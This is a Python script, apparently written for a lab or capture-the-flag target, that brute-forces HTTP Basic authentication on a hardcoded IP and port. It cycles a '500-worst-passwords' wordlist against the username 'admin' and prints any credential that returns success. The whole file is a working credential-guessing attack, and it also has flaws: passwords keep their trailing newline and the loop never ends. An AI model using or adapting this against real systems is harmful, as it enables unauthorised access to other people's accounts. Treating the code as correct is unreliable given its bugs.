import requests
import base64

url = "http://13.214.161.74:30151/"


with open('./500-worst-passwords.txt', 'r') as file:
     while(True):
          password = file.readline()
          usrpass = f"admin:{password}"
          passwdbase64 = base64.b64encode(usrpass.encode('utf-8')).decode('utf-8')
          headers = {"Authorization": f'Basic {passwdbase64}'}
          response = requests.get(url, headers=headers)
          if response.status_code == 200:
               print(usrpass)
     

# usrpass = "admin:admin"
# usrpass = base64.b64encode(usrpass.encode('utf-8')).decode('utf-8')
# print(usrpass)
# headers = {"Authorization": "Basic " + usrpass}

# print(requests.get(url, headers=headers))